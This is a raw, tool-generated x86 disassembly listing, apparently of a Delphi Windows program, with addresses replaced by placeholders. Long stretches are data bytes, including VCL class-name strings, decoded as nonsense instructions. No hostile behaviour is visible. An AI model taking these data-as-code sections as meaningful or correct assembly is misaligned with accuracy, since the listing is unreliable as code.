mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404598
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4042f8
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404598
jmp r-xdata
sub_454748
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404038
mov ebx 0x1
mov eax esi
call sub_4042f8
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404220
sub_4547ac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_454805
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4546b4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4546b4
mov eax [ ebp - 0x8 ]
pop edx
call sub_40809c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45480c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_454814
adc al [ eax ]
add [ eax ] al
xor [ 0x7a200047 ] cl
inc edi
add [ ecx + 0x79c80047 ] ch
inc edi
add [ eax ] ch
or eax 0x79680047
inc edi
add [ ecx + 0x79a00047 ] ah
inc edi
add [ eax ] ah
or eax 0x7cc80047
inc edi
add [ ecx + 0x79b00047 ] bl
inc edi
add [ eax ] bl
or eax 0x7b480047
inc edi
add [ ecx + 0x7ab40047 ] dl
inc edi
add [ eax ] dl
or eax 0x7d580047
inc edi
add [ ecx + 0x7d540047 ] cl
inc edi
add [ eax ] cl
or eax 0x7a700047
inc edi
add [ ecx + 0x7d100047 ] al
inc edi
add [ eax ] al
or eax 0x7cd00047
inc edi
add ah bh
or al 0x47
add [ eax - 0x7ffb883 ] dh
or al 0x47
add [ ebp + edi * 2 + 0x47 ] dh
add ah dh
or al 0x47
add [ eax - 0xfffb886 ] al
or al 0x47
add [ eax - 0x13ffb886 ] dl
or al 0x47
add al dl
jpe r-xdata
add al ch
int3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45490c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454913
retn
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
call sub_4032e8
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
call sub_404038
sub_454918
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_454814
call sub_403de4
mov eax [ r-xdata ]
call sub_416dac
mov eax [ r-xdata ]
call sub_416e4c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov eax [ r-xdata ]
call sub_416cf0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427cf0
mov [ rw-data ] eax
sub_454b29
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
pop eax
jne r-xdata
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
add [ esi - 0x2ea3ffc0 ] bh
inc ecx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + ecx * 2 + 0x45 ] dl
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
xchg esp eax
je r-xdata
inc esp
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + ebx + 0x44 ] ch
add [ eax - 0x73ffbc0f ] al
and al 0x44
add [ eax + 0x200043fa ] bl
outsd
inc esp
add al bl
aaa
dec esi
outsd
jb r-xdata
add [ eax ] cl
ja r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
or eax [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ edi + ebp * 2 + 0x37d80044 ] ah
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
mov ah 0x75
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
fadd [ ecx ]
or ch dl
inc ecx
xor cl 0x43
add [ esp - 0x567ffbc ] cl
inc ebx
add [ eax ] ah
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
[ ebp + esi * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
in al 0x75
inc ebp
add al bh
jne r-xdata
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
xor [ eax + 0x45 ] bh
add [ eax - 0x2bffbb96 ] bh
outsd
inc esp
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
inc ecx
add [ eax ] cl
aad 0x41
jae r-xdata
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
pushfd
jne r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
add al 0x76
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x4c ] bl
inc ebp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
add [ ebp + esi + 0x40 ] al
add [ eax ] dl
inc eax
inc esp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
test al 0x78
inc ebp
shr al 0x4c
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
dec ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0x4de20045 ] bh
inc ebp
add [ edx + eax ] bl
add [ eax ] al
sub al 0xbf
inc ebx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
sub_454dca
cmp al 0x7e
inc ebp
add [ eax ] bl
jg r-xdata
loopne r-xdata
add [ edi + edi * 2 ] bh
inc ebp
add al dl
jg r-xdata
adc al 0x7e
inc ebx
add [ 0x6f460500 ] cl
jb r-xdata
outsd
inc ebp
add [ ecx + edi * 2 + 0x45 ] dh
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ esi + edi * 2 ] dl
push esi
jb r-xdata
outsd
insb
nop
cld
dec ebp
inc ebp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ 0x74000000 ] al
jae r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
call 0xffffffffe0459363
retn 0x43
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
dec edx
inc ebp
add [ eax ] cl
add al [ eax ]
add [ edx + ecx * 2 + 0x45 ] ch
shl ecx 0x2
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + ecx * 2 + 0x45 ] dh
add [ 0x6d726f46 ] al
dec esi
inc ebp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax + 0xc00454f ] bh
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
dec esi
inc ebp
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0x74000000
outsd
imul ebx [ ebp + ebx * 2 + 0x41 ] 0x0
add [ ebp - 0x15e1bce3 ] esp
sub esp edi
dec ebp
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
inc eax
add [ eax ] cl
dec edi
inc ebp
insb
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
lea eax [ eax ]
or [ edi + 0x45 ] cl
insb
add [ gs : eax ] eax
add [ eax ] al
outsb
jne r-xdata
push ebx
je r-xdata
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x454f3cc0 ]
add [ edi ] cl
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
insb
je r-xdata
dec [ ebp + 0x4f6c0040 ]
add bh bh
insd
xchg esp eax
adc [ eax ] eax
add ecx eax
loope r-xdata
inc ebp
add [ ebx ] al
lea eax [ eax ]
insb
dec edi
jb r-xdata
jae r-xdata
dec esi
inc ebp
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x4f ] ch
inc ebp
add [ eax ] cl
jae r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
insd
dec ebp
outsd
jb r-xdata
inc eax
add [ edi + ecx * 2 + 0xb030045 ] bh
push esp
inc edx
outsd
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
int 0xda
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax + edx * 2 + 0x64090045 ] bh
insd
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
rcl [ eax + 0x45 ] 0x0
je r-xdata
push eax
outsd
jb r-xdata
push cs
jo r-xdata
mov eax eax
or al 0x50
inc esi
outsd
jb r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
je r-xdata
je r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
push cs
je r-xdata
jne r-xdata
popad
je r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc esp
jae r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov esp 0x9004550
insd
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
nop
inc esi
outsd
jb r-xdata
jae r-xdata
jo r-xdata
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
jae r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] ah
push eax
inc ebp
add [ edx ] cl
jo r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
add [ esi ] al
or al 0x54
ror [ eax + edx * 2 ] 0x45
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
pop esp
push ecx
inc ebp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
jb r-xdata
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
dec edi
inc ebp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
jae r-xdata
mov eax 0x9000454f
and al 0x50
popad
dec ebp
je r-xdata
inc ebp
jns r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax + 0x51 ] bl
inc ebp
add [ ebp + 0x51e80040 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
push ecx
inc ebp
inc eax
add [ ecx + edx * 2 + 0xb080045 ] ah
push esp
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
adc [ eax ] al
nop
sub al 0x52
inc ebp
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax + 0x51 ] bl
outsd
movsb [ edi ] [ esi ]
jo r-xdata
dec esi
outsd
outsb
push cs
jb r-xdata
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ gs : eax ] eax
add [ eax ] al
push ecx
inc ebp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add eax 0x6d726f46
jo r-xdata
inc ebp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
pop eax
push ecx
inc esp
jae r-xdata
jb r-xdata
jo r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
add [ ebp ] r-xdata
inc esp
pushfd
dec esp
inc ebp
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
or al 0x53
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
inc esi
outsd
jb r-xdata
inc ebx
outsb
je r-xdata
push eax
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jb r-xdata
lea eax [ eax ]
mov esp 0x300454f
or edx [ edx + eax * 2 + 0x6f ]
inc esi
outsd
jb r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
inc ebp
add [ ebp + edx * 2 + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
and dl [ ebp + eax * 2 ]
xchg edx eax
push ebp
inc ebp
add al bh
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x530c0040 ] cl
jbe r-xdata
add [ eax ] cl
fadd [ ecx ]
in al dx
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
add [ esi ] al
jo r-xdata
add [ eax ] al
adc [ ecx + 0x45 ] dl
jae r-xdata
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
inc ebp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
push eax
jae r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add al [ eax ]
add [ esp + ecx * 2 - 0x27f7ffbb ] bl
inc ecx
add ah ch
add [ eax ] al
add [ eax ] al
add [ edx ] ah
push esp
inc ebp
add [ edx - 0x7ffbaab ] dl
outsb
je r-xdata
xor eax 0xa80c0040
inc ebp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
or [ ebp + eax * 2 + 0x446fa400 ] al
add [ eax - 0x77 ] bh
inc ebp
add [ ebx + edi * 2 ] dl
inc ecx
add al cl
test [ ebp ] eax
add al 0x86
inc ebp
add [ eax ] dl
xchg [ ebp ] eax
cwde
cli
inc ebx
add [ eax ] ah
fadd [ ecx ]
mov [ edi - 0x2affffbb ] cl
inc ecx
add [ eax ] ch

mov al [ 0x44004583 ]
jb r-xdata
push ecx
inc ebp
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push 0x8004552
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
insd
outsd
adc [ eax + 0x6f ] esi
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_45536e
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ eax - 0x71 ] dl
inc ebp
add [ esi + ecx * 4 ] bl
inc ebp
add [ ebp + edi * 8 + 0x43 ] al
add al cl
pop [ ebp ]
in al dx
pop ds
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x7f600044 ] ah
inc ebp
add [ esi + edx * 4 + 0x45 ] ch
add [ eax ] bh
cmp [ eax + eax + 0x30 ] eax
mov [ 0xffffffffa6900045 ] eax
inc ebp
add [ ebp + 0x45 ] cl
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x38 ] eax
cmpsd [ esi ] [ edi ]
inc ebp
add [ eax + edi ] dh
inc esp
add ah ah
inc esp
add [ esi + ebp * 4 + 0x76740045 ] bh
inc esp
add [ eax ] ch
popad
inc esp
add al dl
retn
sub_4553d2
inc ebp
add [ ecx + edi * 2 + 0x45 ] dl
add [ esp + edi * 2 ] al
inc ebp
add [ eax - 0x13ffba4c ] dh
test [ ebp ] al
push 0xb0004585
mov [ ebp ] sub_458224
mov ah 0xc2
inc ebp
add [ ecx + ebp * 4 - 0x3b97ffbb ] dl
inc ebp
add [ edi + ecx * 4 + 0x45 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
cmp al 0x2
add [ eax ] al
add al 0x4f
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
cmp [ edi + 0x45 ] cl
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
sub_4555c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edi + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 ] al
inc ebp
add al bh
add al [ eax ]
add al al
push edx
inc ebp
add [ eax ] cl
fadd [ ecx ]
in al dx
add [ ebp ] r-xdata
inc esp
xor eax 0xa80c0040
inc ebp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
or [ ebp + eax * 2 + 0x446fa400 ] al
add [ eax - 0x77 ] bh
inc ebp
add [ ebx + edi * 2 ] dl
inc ecx
add al cl
test [ ebp ] eax
add al 0x86
inc ebp
add [ eax ] dl
xchg [ ebp ] eax
cwde
cli
inc ebx
add [ eax ] ah
fadd [ ecx ]
mov [ edi - 0x2affffbb ] cl
inc ecx
add [ eax ] ch

sub_455672
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ eax - 0x71 ] dl
inc ebp
add [ esi + ecx * 4 ] bl
inc ebp
add [ ebp + edi * 8 + 0x43 ] al
add al cl
pop [ ebp ]
in al dx
pop ds
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x7f600044 ] ah
inc ebp
add [ esi + edx * 4 + 0x45 ] ch
add [ eax ] bh
cmp [ eax + eax + 0x30 ] eax
mov [ 0xffffffffa6900045 ] eax
inc ebp
add [ ebp + 0x45 ] cl
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x38 ] eax
cmpsd [ esi ] [ edi ]
inc ebp
add [ eax + edi ] dh
inc esp
add ah ah
inc esp
add [ esi + ebp * 4 + 0x76740045 ] bh
inc esp
add [ eax ] ch
popad
inc esp
add al dl
retn
sub_45577b
int1
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
inc [ esp + ecx * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
insb
adc [ eax ] al
loope r-xdata
outsd
outsb
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
cwde
int3
add bh bh
add [ esi + ecx * 4 + 0x45 ] dh
add [ ebx + ecx * 4 + 0x45 ] bl
add [ eax - 0x80000000 ] al
sbb al [ eax ]
or al 0x43
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ esi + esi * 8 - 0x71bbffbd ] dh
inc ebp
add [ ebx + ecx * 4 + 0x45 ] bl
dec esi
inc ebp
add [ ecx ] ch
add al [ eax ]
jmp [ eax + ebx * 4 ]
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
aam 0xfd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x865646f
push eax
inc ebp
add [ eax ] ch
add al [ eax ]
popad
outsb
jae r-xdata
xor al 0xe7
inc ecx
add [ eax ] dh
add bh bh
push eax
inc [ ebx ]
insb
inc [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
inc esp
mov es [ ebp ]
pushfd
mov eax [ ebp ]
add [ eax ] al
insb
fdivr [ gs : ebp + 0x16c0043 ]
add bh bh
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
call 0xffffffffc144597a
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add bh bh
adc [ esi + 0x44 ] ah
push eax
inc ebp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
push eax
0x45 0x8000
add [ eax ] al
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x64ff0001 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec ah
sbb al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
inc ebp
je r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
imul esp [ gs : edi + 0x68 ] 0x4010e474
outsb
je r-xdata
